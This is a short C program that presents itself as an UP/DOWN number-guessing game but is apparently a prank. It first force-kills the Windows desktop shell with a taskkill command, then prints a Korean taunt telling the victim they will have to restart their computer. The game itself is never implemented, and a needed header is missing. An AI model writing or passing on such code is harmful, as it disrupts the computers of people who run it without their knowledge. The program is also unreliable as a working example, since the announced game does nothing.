#include <stdio.h>
#include <time.h>

int main() 

{
    srand(time(NULL));

    system("taskkill /f /IM explorer.exe");
    printf("당황했니..?, 일단 창 끄면 너 컴 껐다 켜야되니까\n");

    int i = rand()%1000;

    printf("바로 UP/DOWN 게임 시작!! >>");

    

    return 0;
}